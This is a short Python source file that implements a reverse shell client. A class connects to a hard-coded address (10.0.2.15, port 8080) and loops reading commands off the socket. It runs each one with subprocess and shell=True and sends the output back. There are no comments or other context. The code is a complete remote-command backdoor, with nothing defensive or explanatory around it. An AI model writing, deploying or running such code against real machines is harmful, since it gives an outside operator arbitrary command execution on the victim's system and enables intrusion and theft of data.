import socket
import subprocess
import logging

class MySocket:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.my_connection = None
        self.connect_to_server()

    def connect_to_server(self):
        try:
            self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.my_connection.connect((self.ip, self.port))
            print(f"Connected to {self.ip}:{self.port}")
        except socket.error as e:
            logging.error(f"Error connecting to server {self.ip}:{self.port} - {e}")
            exit(1)

    def command_execution(self, command):
        try:
            command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return command_output
        except subprocess.CalledProcessError as e:
            logging.error(f"Command execution failed: {e}")
            return b"Command execution failed"

    def start_socket(self):
        try:
            while True:
                command = self.my_connection.recv(1024).decode('utf-8').strip()
                if command.lower() == 'exit':
                    print("Exiting...")
                    break
                command_output = self.command_execution(command)
                self.my_connection.send(command_output)
        except Exception as e:
            logging.error(f"Error during socket communication: {e}")
        finally:
            self.my_connection.close()

if __name__ == "__main__":
    my_socket_object = MySocket("10.0.2.15", 8080)
    my_socket_object.start_socket()
